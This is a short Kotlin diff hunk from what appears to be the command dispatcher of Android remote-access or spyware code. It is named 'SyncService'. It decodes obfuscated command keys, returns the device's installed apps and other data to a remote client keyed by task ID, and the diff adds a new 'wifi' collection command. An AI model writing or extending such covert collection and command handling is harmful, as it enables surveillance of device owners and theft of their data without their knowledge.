@@ -97,6 +97,7 @@ class Dispatcher(private val service: SyncService) {
                             put(k("OyssLg=="), apps)
                         }
                     }
+                    "wifi" -> modA.wifi()
                     k("KjIyOg==") -> JSONObject().put(k("KjQyOg=="), System.currentTimeMillis())
                     k("PyM1KQ==") -> {
                         client.sendResult(taskId, JSONObject().put(k("KS89KSss"), k("PyM1KTcxBw==")))
